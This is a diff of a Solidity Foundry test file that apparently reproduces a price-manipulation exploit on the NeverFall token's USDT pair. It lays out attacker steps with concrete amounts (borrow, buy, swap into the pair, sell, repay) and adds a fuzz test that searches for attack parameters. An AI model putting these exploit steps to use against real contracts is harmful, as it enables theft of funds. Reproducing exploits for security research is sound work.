@@ -201,14 +201,6 @@ contract NeverFallTestBase is Test, BlockLoader {
         pair.transfer(owner, amount);
     }
 
-    function swap_pair_attacker_usdt_neverFall(
-        uint256 amount,
-        uint256 amountOut
-    ) internal eurus {
-        usdt.transfer(address(pair), amount);
-        pair.swap(0, amountOut, attacker, new bytes(0));
-    }
-
     function swap_pair_attacker_neverFall_usdt(
         uint256 amount,
         uint256 amountOut
@@ -217,23 +209,20 @@ contract NeverFallTestBase is Test, BlockLoader {
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function swap_neverFall_attacker_usdt_neverFall(
-        uint256 amount,
-        uint256 amountOut
-    ) internal eurus {
+    function deposit_neverFall_usdt_neverFall(uint256 amount) internal eurus {
         IERC20(usdt).approve(address(neverFall), type(uint256).max);
         NeverFall(neverFall).buy(amount);
     }
 
-    function swap_neverFall_attacker_neverFall_usdt(
-        uint256 amount,
-        uint256 amountOut
-    ) internal eurus {
+    function withdraw_neverFall_neverFall_usdt(uint256 amount) internal eurus {
         IERC20(usdt).approve(address(neverFall), type(uint256).max);
         NeverFall(neverFall).sell(amount);
     }
 
-    function burn_neverFall_pair(uint256 amount) internal eurus {
+    function swap_pair_attacker_usdt_neverFall(
+        uint256 amount,
+        uint256 amountOut
+    ) internal eurus {
         usdt.transfer(address(pair), amount);
         pair.swap(
             0,
@@ -247,14 +236,11 @@ contract NeverFallTestBase is Test, BlockLoader {
         vm.startPrank(attacker);
         borrow_usdt_owner(1600000e18);
         printBalance("After step0 ");
-        swap_neverFall_attacker_usdt_neverFall(200000 * 1e18, 1);
+        deposit_neverFall_usdt_neverFall(200000 * 1e18);
         printBalance("After step1 ");
-        burn_neverFall_pair(1300000 * 1e18);
+        swap_pair_attacker_usdt_neverFall(1300000 * 1e18, 0);
         printBalance("After step2 ");
-        swap_neverFall_attacker_neverFall_usdt(
-            neverFall.balanceOf(attacker),
-            1
-        );
+        withdraw_neverFall_neverFall_usdt(neverFall.balanceOf(attacker));
         printBalance("After step3 ");
         payback_usdt_owner(1600000e18);
         printBalance("After step4 ");
@@ -268,16 +254,15 @@ contract NeverFallTestBase is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 >= amt0);
+        vm.assume(amt5 >= amt0);
         borrow_usdt_owner(amt0);
-        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
-        burn_neverFall_pair(amt3);
-        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
-        payback_usdt_owner(amt6);
+        deposit_neverFall_usdt_neverFall(amt1);
+        swap_pair_attacker_usdt_neverFall(amt2, amt3);
+        withdraw_neverFall_neverFall_usdt(amt4);
+        payback_usdt_owner(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
